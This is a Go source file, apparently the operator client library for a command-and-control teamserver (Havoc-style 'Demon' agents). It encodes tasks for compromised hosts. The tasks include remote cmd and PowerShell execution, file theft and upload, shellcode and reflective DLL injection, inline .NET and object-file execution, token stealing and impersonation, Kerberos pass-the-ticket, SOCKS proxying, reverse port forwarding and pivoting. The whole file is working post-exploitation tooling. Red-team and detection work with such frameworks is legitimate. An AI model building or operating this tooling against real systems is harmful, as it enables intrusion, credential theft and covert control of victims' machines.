package operator

import (
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"
	"time"
)

// CommandID constants matching teamserver/pkg/agent/demons.go
const (
	CommandProc                  = 0x1010 // 4112
	CommandFs                    = 15
	CommandSleep                 = 11
	CommandProcList              = 12
	CommandCheckin               = 100
	CommandJob                   = 21
	CommandExit                  = 92
	CommandToken                 = 40
	CommandInlineExecute         = 20
	CommandInjectDLL             = 22
	CommandInjectShellcode       = 24
	CommandInjectDLLSpawn        = 26
	CommandAssemblyInlineExecute = 0x2001
	CommandAssemblyListVersions  = 0x2003
	CommandNet                   = 2100
	CommandConfig                = 2500
	CommandScreenshot            = 2510
	CommandPivot                 = 2520
	CommandTransfer              = 2530
	CommandSocket                = 2540
	CommandKerberos              = 2550
	CommandTeamserver            = -1 // Special marker for "Teamserver" string
)

// DirOptions holds options for dir/ls command.
type DirOptions struct {
	Path      string
	Recursive bool
	FilesOnly bool
	DirsOnly  bool
	ListOnly  bool
	Starts    string
	Contains  string
	Ends      string
}

// TokenOptions holds the fields accepted by the token command's subcommands.
type TokenOptions struct {
	SubCommand string
	TokenID    string
	ProcessID  int
	Handle     string
	Domain     string
	Username   string
	Password   string
	LogonType  string
	Privilege  string
}

// RportfwdOptions holds the fields accepted by reverse port forwarding.
type RportfwdOptions struct {
	Action   string
	BindHost string
	BindPort int
	Host     string
	Port     int
	SocketID string
}

// ProcOptions holds the fields accepted by the proc command's subcommands.
type ProcOptions struct {
	Action      string
	PID         int
	ProcessName string
	State       string
	Silent      bool
	NoPipe      bool
	Program     string
	Arguments   string
	BlockDLL    string
	Protection  string
}

// TaskRequest represents a task to send to an agent.
type TaskRequest struct {
	SessionID   string
	CommandID   int
	Info        map[string]string
	CommandLine string
}

// ShellTask creates a shell command task.
func ShellTask(sessionID, command string) TaskRequest {
	encodedCmd := base64.StdEncoding.EncodeToString([]byte("/c " + command))
	args := fmt.Sprintf("0;FALSE;TRUE;c:\\windows\\system32\\cmd.exe;%s", encodedCmd)

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandProc,
		Info: map[string]string{
			"DemonID":     sessionID,
			"CommandID":   strconv.Itoa(CommandProc),
			"ProcCommand": "4",
			"Args":        args,
		},
		CommandLine: "shell " + command,
	}
}

// PowerShellTask creates a PowerShell command task.
func PowerShellTask(sessionID, command string) TaskRequest {
	encodedCmd := base64.StdEncoding.EncodeToString([]byte("-C " + command))
	args := fmt.Sprintf("0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;%s", encodedCmd)

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandProc,
		Info: map[string]string{
			"DemonID":     sessionID,
			"CommandID":   strconv.Itoa(CommandProc),
			"ProcCommand": "4",
			"Args":        args,
		},
		CommandLine: "powershell " + command,
	}
}

// DirTask creates a directory listing task.
func DirTask(sessionID string, opts DirOptions) TaskRequest {
	path := opts.Path
	if path == "" {
		path = "."
	}

	// Arguments: path;subdirs;filesOnly;dirsOnly;listOnly;starts;contains;ends
	args := fmt.Sprintf("%s;%v;%v;%v;%v;%s;%s;%s",
		path,
		opts.Recursive,
		opts.FilesOnly,
		opts.DirsOnly,
		opts.ListOnly,
		opts.Starts,
		opts.Contains,
		opts.Ends,
	)

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "dir",
			"Arguments":  args,
		},
		CommandLine: fmt.Sprintf("ls %s", path),
	}
}

// CdTask creates a change directory task.
func CdTask(sessionID, path string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "cd",
			"Arguments":  path,
		},
		CommandLine: "cd " + path,
	}
}

// PwdTask creates a print working directory task.
func PwdTask(sessionID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "pwd",
			"Arguments":  "",
		},
		CommandLine: "pwd",
	}
}

// CatTask creates a file read task.
func CatTask(sessionID, path string) TaskRequest {
	encodedPath := base64.StdEncoding.EncodeToString([]byte(path))
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "cat",
			"Arguments":  encodedPath,
		},
		CommandLine: "cat " + path,
	}
}

// DownloadTask creates a file download task.
func DownloadTask(sessionID, path string) TaskRequest {
	encodedPath := base64.StdEncoding.EncodeToString([]byte(path))
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "download",
			"Arguments":  encodedPath,
		},
		CommandLine: "download " + path,
	}
}

// PsTask creates a process list task.
func PsTask(sessionID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandProcList,
		Info: map[string]string{
			"DemonID":            sessionID,
			"CommandID":          strconv.Itoa(CommandProcList),
			"FromProcessManager": "false",
		},
		CommandLine: "ps",
	}
}

// KillTask creates a process kill task.
func KillTask(sessionID string, pid int) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandProc,
		Info: map[string]string{
			"DemonID":     sessionID,
			"CommandID":   strconv.Itoa(CommandProc),
			"ProcCommand": "7",
			"Args":        strconv.Itoa(pid),
		},
		CommandLine: fmt.Sprintf("kill %d", pid),
	}
}

// SleepTask creates a sleep modification task.
func SleepTask(sessionID string, delay, jitter int) TaskRequest {
	args := fmt.Sprintf("%d;%d", delay, jitter)
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandSleep,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandSleep),
			"Arguments": args,
		},
		CommandLine: fmt.Sprintf("sleep %d %d", delay, jitter),
	}
}

// ExitTask creates an agent exit task.
func ExitTask(sessionID, method string) TaskRequest {
	if method == "" {
		method = "thread"
	}
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandExit,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandExit),
			"ExitMethod": method,
		},
		CommandLine: "exit " + method,
	}
}

// JobsTask creates a job list task.
func JobsTask(sessionID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandJob,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandJob),
			"Command":   "list",
			"Param":     "0",
		},
		CommandLine: "jobs",
	}
}

// CheckinTask creates an immediate agent check-in task.
func CheckinTask(sessionID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandCheckin,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandCheckin),
		},
		CommandLine: "checkin",
	}
}

// JobTask creates a job-manager task.
func JobTask(sessionID, action string, jobID int) TaskRequest {
	param := "0"
	if action != "list" {
		param = strconv.Itoa(jobID)
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandJob,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandJob),
			"Command":   action,
			"Param":     param,
		},
		CommandLine: fmt.Sprintf("job %s %s", action, param),
	}
}

// ProcTask creates a process-management task.
func ProcTask(sessionID string, opts ProcOptions) TaskRequest {
	switch opts.Action {
	case "list":
		return TaskRequest{
			SessionID: sessionID,
			CommandID: CommandProcList,
			Info: map[string]string{
				"DemonID":            sessionID,
				"CommandID":          strconv.Itoa(CommandProcList),
				"FromProcessManager": "false",
			},
			CommandLine: "proc list",
		}
	case "modules":
		return procModuleTask(sessionID, "2", strconv.Itoa(opts.PID), fmt.Sprintf("proc modules %d", opts.PID))
	case "grep":
		return procModuleTask(sessionID, "3", opts.ProcessName, "proc grep "+opts.ProcessName)
	case "create":
		return procCreateTask(sessionID, opts, "proc create")
	case "blockdll":
		return procModuleTask(sessionID, "5", opts.BlockDLL, "proc blockdll "+opts.BlockDLL)
	case "kill":
		return procModuleTask(sessionID, "7", strconv.Itoa(opts.PID), fmt.Sprintf("proc kill %d", opts.PID))
	case "memory":
		args := fmt.Sprintf("%d %s", opts.PID, opts.Protection)
		return procModuleTask(sessionID, "6", args, fmt.Sprintf("proc memory %d %s", opts.PID, opts.Protection))
	default:
		return TaskRequest{}
	}
}

// SpawnTask creates a process-spawn task using the raw proc-create encoding.
func SpawnTask(sessionID string, opts ProcOptions) TaskRequest {
	opts.Action = "create"
	return procCreateTask(sessionID, opts, "proc create")
}

// procModuleTask builds a task for one of the proc command's numeric modules.
func procModuleTask(sessionID, subcommand, args, commandLine string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandProc,
		Info: map[string]string{
			"DemonID":     sessionID,
			"CommandID":   strconv.Itoa(CommandProc),
			"ProcCommand": subcommand,
			"Args":        args,
		},
		CommandLine: commandLine,
	}
}

// procCreateTask builds the proc-create encoding used by proc and spawn.
func procCreateTask(sessionID string, opts ProcOptions, commandName string) TaskRequest {
	if opts.State == "" {
		opts.State = "normal"
	}

	flags := "0"
	if opts.State == "suspended" {
		flags = "4"
	}

	verbose := "TRUE"
	if opts.Silent {
		verbose = "FALSE"
	}

	piped := "TRUE"
	if opts.NoPipe {
		piped = "FALSE"
	}

	arguments := "\"" + opts.Program + "\""
	if opts.Arguments != "" {
		arguments += " " + opts.Arguments
	}

	commandLine := []string{commandName, opts.State}
	if opts.Silent {
		commandLine = append(commandLine, "--silent")
	}
	if opts.NoPipe {
		commandLine = append(commandLine, "--no-pipe")
	}
	commandLine = append(commandLine, opts.Program)
	if opts.Arguments != "" {
		commandLine = append(commandLine, opts.Arguments)
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandProc,
		Info: map[string]string{
			"DemonID":     sessionID,
			"CommandID":   strconv.Itoa(CommandProc),
			"ProcCommand": "4",
			"Args": fmt.Sprintf("%s;%s;%s;%s;%s", flags, verbose, piped, opts.Program,
				base64.StdEncoding.EncodeToString([]byte(arguments))),
		},
		CommandLine: strings.Join(commandLine, " "),
	}
}

// TransferTask creates a download-transfer management task.
func TransferTask(sessionID, action, fileID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandTransfer,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandTransfer),
			"Command":   action,
			"FileID":    fileID,
		},
		CommandLine: fmt.Sprintf("transfer %s %s", action, fileID),
	}
}

// NetTask creates a network-enumeration task.
func NetTask(sessionID, action, target string) TaskRequest {
	commands := map[string]string{
		"domain":     "1",
		"logons":     "2",
		"sessions":   "3",
		"share":      "6",
		"localgroup": "7",
		"group":      "8",
		"users":      "9",
	}

	command := commands[action]
	if action == "domain" {
		target = ""
	} else if target == "" {
		target = `\\localhost`
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandNet,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandNet),
			"NetCommand": command,
			"Param":      target,
		},
		CommandLine: fmt.Sprintf("net %s %s", action, target),
	}
}

// PivotTask creates a pivot-management task.
func PivotTask(sessionID, action, host, address, agentID string) TaskRequest {
	command := ""
	param := ""
	commandLine := "pivot " + action

	switch action {
	case "list":
		command = "1"
	case "connect":
		command = "10"
		param = fmt.Sprintf(`\\%s\pipe\%s`, host, address)
		commandLine += " " + host + " " + address
	case "disconnect":
		command = "11"
		param = agentID
		commandLine += " " + agentID
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandPivot,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandPivot),
			"Command":   command,
			"Param":     param,
		},
		CommandLine: commandLine,
	}
}

// ScreenshotTask creates a screenshot task.
func ScreenshotTask(sessionID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandScreenshot,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandScreenshot),
		},
		CommandLine: "screenshot",
	}
}

// SocksTask creates a SOCKS proxy task.
func SocksTask(sessionID, action, params string) TaskRequest {
	commandLine := "socks " + action
	if params != "" {
		commandLine += " " + params
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandSocket,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandSocket),
			"Command":   "socks " + action,
			"Params":    params,
		},
		CommandLine: commandLine,
	}
}

// RportfwdTask creates a reverse port forwarding task.
func RportfwdTask(sessionID string, opts RportfwdOptions) TaskRequest {
	params := ""
	commandLine := "rportfwd " + opts.Action
	switch opts.Action {
	case "add":
		params = fmt.Sprintf("%s;%d;%s;%d", opts.BindHost, opts.BindPort, opts.Host, opts.Port)
		commandLine = fmt.Sprintf("rportfwd add %s %d %s %d", opts.BindHost, opts.BindPort, opts.Host, opts.Port)
	case "remove":
		params = opts.SocketID
		commandLine = "rportfwd remove " + opts.SocketID
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandSocket,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandSocket),
			"Command":   "rportfwd " + opts.Action,
			"Params":    params,
		},
		CommandLine: commandLine,
	}
}

// TokenTask creates a token management task.
func TokenTask(sessionID string, opts TokenOptions) TaskRequest {
	arguments := ""
	commandLine := "token " + opts.SubCommand

	switch opts.SubCommand {
	case "impersonate":
		arguments = opts.TokenID
		commandLine += " " + opts.TokenID
	case "steal":
		handle := opts.Handle
		if handle == "" {
			handle = "0"
		}
		arguments = fmt.Sprintf("%d;%s", opts.ProcessID, handle)
		commandLine += fmt.Sprintf(" %d %s", opts.ProcessID, handle)
	case "make":
		logonType := tokenLogonType(opts.LogonType)
		arguments = strings.Join([]string{
			base64.StdEncoding.EncodeToString([]byte(opts.Domain)),
			base64.StdEncoding.EncodeToString([]byte(opts.Username)),
			base64.StdEncoding.EncodeToString([]byte(opts.Password)),
			logonType,
		}, ";")
		commandLine += fmt.Sprintf(" %s %s [REDACTED] %s", opts.Domain, opts.Username, logonType)
	case "remove":
		arguments = opts.TokenID
		commandLine += " " + opts.TokenID
	case "privs-get":
		arguments = opts.Privilege
		commandLine += " " + opts.Privilege
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandToken,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandToken),
			"SubCommand": opts.SubCommand,
			"Arguments":  arguments,
		},
		CommandLine: commandLine,
	}
}

// tokenLogonType maps the console's symbolic logon type to its numeric value.
func tokenLogonType(value string) string {
	switch strings.ToUpper(value) {
	case "", "LOGON_NEW_CREDENTIALS":
		return "9"
	case "LOGON_INTERACTIVE":
		return "2"
	case "LOGON_NETWORK":
		return "3"
	case "LOGON_BATCH":
		return "4"
	case "LOGON_SERVICE":
		return "5"
	case "LOGON_UNLOCK":
		return "7"
	case "LOGON_NETWORK_CLEARTEXT":
		return "8"
	default:
		return "9"
	}
}

// ShellcodeTask creates a shellcode injection, spawn, or self-execution task.
func ShellcodeTask(sessionID, action, arch string, pid int, content []byte, arguments string, sourcePath ...string) TaskRequest {
	way := ""
	switch action {
	case "inject":
		way = "Inject"
	case "spawn":
		way = "Spawn"
	case "execute":
		way = "Execute"
	}

	encodedArguments := base64.StdEncoding.EncodeToString([]byte(arguments))
	info := map[string]string{
		"DemonID":   sessionID,
		"CommandID": strconv.Itoa(CommandInjectShellcode),
		"Way":       way,
		"Technique": "default",
		"Binary":    base64.StdEncoding.EncodeToString(content),
		"Argument":  encodedArguments,
		"Arguments": encodedArguments,
		"Arch":      arch,
	}
	commandLine := fmt.Sprintf("shellcode %s %s", action, arch)
	if action == "inject" {
		info["PID"] = strconv.Itoa(pid)
		commandLine = fmt.Sprintf("shellcode inject %s %d", arch, pid)
	}
	if len(sourcePath) > 0 && sourcePath[0] != "" {
		commandLine += " " + sourcePath[0]
	}

	return TaskRequest{
		SessionID:   sessionID,
		CommandID:   CommandInjectShellcode,
		Info:        info,
		CommandLine: commandLine,
	}
}

// DotnetTask creates a .NET inline-execution or version-listing task.
func DotnetTask(sessionID, action string, content []byte, arguments string, sourcePath ...string) TaskRequest {
	if action == "list-versions" {
		return TaskRequest{
			SessionID: sessionID,
			CommandID: CommandAssemblyListVersions,
			Info: map[string]string{
				"DemonID":   sessionID,
				"CommandID": strconv.Itoa(CommandAssemblyListVersions),
			},
			CommandLine: "dotnet list-versions",
		}
	}

	commandLine := "dotnet inline-execute"
	if len(sourcePath) > 0 && sourcePath[0] != "" {
		commandLine += " " + sourcePath[0]
	}
	if arguments != "" {
		commandLine += " " + arguments
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandAssemblyInlineExecute,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandAssemblyInlineExecute),
			"Binary":    base64.StdEncoding.EncodeToString(content),
			"Arguments": arguments,
		},
		CommandLine: commandLine,
	}
}

// InlineExecuteTask creates an object-file inline-execution task.
func InlineExecuteTask(sessionID string, content []byte, arguments string, sourcePath ...string) TaskRequest {
	commandLine := "inline-execute"
	if len(sourcePath) > 0 && sourcePath[0] != "" {
		commandLine += " " + sourcePath[0]
	}
	if arguments != "" {
		commandLine += " " + arguments
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandInlineExecute,
		Info: map[string]string{
			"DemonID":      sessionID,
			"CommandID":    strconv.Itoa(CommandInlineExecute),
			"HasCallback":  "false",
			"FunctionName": "go",
			"Binary":       base64.StdEncoding.EncodeToString(content),
			"Arguments":    base64.StdEncoding.EncodeToString([]byte(arguments)),
			"Flags":        "default",
		},
		CommandLine: commandLine,
	}
}

// DllTask creates a reflective DLL injection or spawn task.
func DllTask(sessionID, action string, content []byte, arguments string, pid int, sourcePath ...string) TaskRequest {
	commandID := CommandInjectDLL
	info := map[string]string{
		"DemonID":   sessionID,
		"CommandID": strconv.Itoa(CommandInjectDLL),
		"Binary":    base64.StdEncoding.EncodeToString(content),
		"Arguments": arguments,
	}
	commandLine := fmt.Sprintf("dll inject %d", pid)

	if action == "spawn" {
		commandID = CommandInjectDLLSpawn
		info["CommandID"] = strconv.Itoa(CommandInjectDLLSpawn)
		info["Arguments"] = base64.StdEncoding.EncodeToString([]byte(arguments))
		commandLine = "dll spawn"
	} else {
		info["PID"] = strconv.Itoa(pid)
	}
	if len(sourcePath) > 0 && sourcePath[0] != "" {
		commandLine += " " + sourcePath[0]
	}
	if arguments != "" {
		commandLine += " " + arguments
	}

	return TaskRequest{
		SessionID:   sessionID,
		CommandID:   commandID,
		Info:        info,
		CommandLine: commandLine,
	}
}

// InteractiveTask creates a task that requests an immediate check-in.
func InteractiveTask(sessionID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandSleep,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandSleep),
			"Arguments": "0;0",
		},
		CommandLine: "interactive",
	}
}

// CpTask creates a file-copy task.
func CpTask(sessionID, source, destination string) TaskRequest {
	arguments := base64.StdEncoding.EncodeToString([]byte(source)) + ";" +
		base64.StdEncoding.EncodeToString([]byte(destination))
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "cp",
			"Arguments":  arguments,
		},
		CommandLine: fmt.Sprintf("cp %s %s", source, destination),
	}
}

// MvTask creates a file-move task.
func MvTask(sessionID, source, destination string) TaskRequest {
	arguments := base64.StdEncoding.EncodeToString([]byte(source)) + ";" +
		base64.StdEncoding.EncodeToString([]byte(destination))
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "mv",
			"Arguments":  arguments,
		},
		CommandLine: fmt.Sprintf("mv %s %s", source, destination),
	}
}

// RemoveTask creates a file or directory removal task.
func RemoveTask(sessionID, path string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "remove",
			"Arguments":  path,
		},
		CommandLine: "remove " + path,
	}
}

// MkdirTask creates a directory creation task.
func MkdirTask(sessionID, path string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "mkdir",
			"Arguments":  path,
		},
		CommandLine: "mkdir " + path,
	}
}

// UploadTask creates a file-upload task from base64-encoded file content.
func UploadTask(sessionID, remotePath, contentBase64 string) TaskRequest {
	arguments := base64.StdEncoding.EncodeToString([]byte(remotePath)) + ";" + contentBase64
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandFs,
		Info: map[string]string{
			"DemonID":    sessionID,
			"CommandID":  strconv.Itoa(CommandFs),
			"SubCommand": "upload",
			"Arguments":  arguments,
		},
		CommandLine: "upload " + remotePath,
	}
}

// ConfigTask creates a runtime configuration task.
func ConfigTask(sessionID, key, value string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandConfig,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandConfig),
			"ConfigKey": key,
			"ConfigVal": value,
		},
		CommandLine: fmt.Sprintf("config %s %s", key, value),
	}
}

// LuidTask creates a Kerberos logon-ID task.
func LuidTask(sessionID string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandKerberos,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandKerberos),
			"Command":   "luid",
		},
		CommandLine: "luid",
	}
}

// KlistTask creates a Kerberos ticket-list task.
func KlistTask(sessionID, argument1, argument2 string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandKerberos,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandKerberos),
			"Command":   "klist",
			"Argument1": argument1,
			"Argument2": argument2,
		},
		CommandLine: fmt.Sprintf("klist %s %s", argument1, argument2),
	}
}

// PurgeTask creates a Kerberos ticket-purge task.
func PurgeTask(sessionID, luid string) TaskRequest {
	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandKerberos,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandKerberos),
			"Command":   "purge",
			"Argument":  luid,
		},
		CommandLine: "purge /luid " + luid,
	}
}

// PttTask creates a Kerberos ticket-import task. ticketBase64 must contain
// the standard base64 encoding of the ticket bytes, matching the client and
// teamserver decoder contract.
func PttTask(sessionID, ticketBase64, luid string) TaskRequest {
	if luid == "" {
		luid = "0"
	}

	return TaskRequest{
		SessionID: sessionID,
		CommandID: CommandKerberos,
		Info: map[string]string{
			"DemonID":   sessionID,
			"CommandID": strconv.Itoa(CommandKerberos),
			"Command":   "ptt",
			"Ticket":    ticketBase64,
			"Luid":      luid,
		},
		CommandLine: fmt.Sprintf("ptt %s /luid %s", ticketBase64, luid),
	}
}

// SendRawCommandTask creates a raw command task (escape hatch).
func SendRawCommandTask(sessionID string, commandID any, info map[string]string, commandLine string) TaskRequest {
	if info == nil {
		info = make(map[string]string)
	}

	var cmdIDStr string
	switch v := commandID.(type) {
	case int:
		cmdIDStr = strconv.Itoa(v)
	case string:
		cmdIDStr = v
	default:
		cmdIDStr = "0"
	}

	// Ensure DemonID and CommandID are in info
	if _, ok := info["DemonID"]; !ok {
		info["DemonID"] = sessionID
	}
	if _, ok := info["CommandID"]; !ok {
		info["CommandID"] = cmdIDStr
	}

	return TaskRequest{
		SessionID:   sessionID,
		CommandID:   0, // Will be parsed from info
		Info:        info,
		CommandLine: commandLine,
	}
}

// generateTaskID generates an 8-hex uppercase task ID.
func generateTaskID() string {
	return fmt.Sprintf("%08X", time.Now().UnixNano()&0xFFFFFFFF)
}

// PrepareTaskRequest prepares a task request with generated TaskID.
func PrepareTaskRequest(req TaskRequest) TaskRequest {
	taskID := generateTaskID()
	if req.Info == nil {
		req.Info = make(map[string]string)
	}
	req.Info["TaskID"] = taskID
	if _, ok := req.Info["CommandLine"]; !ok {
		req.Info["CommandLine"] = req.CommandLine
	}
	return req
}
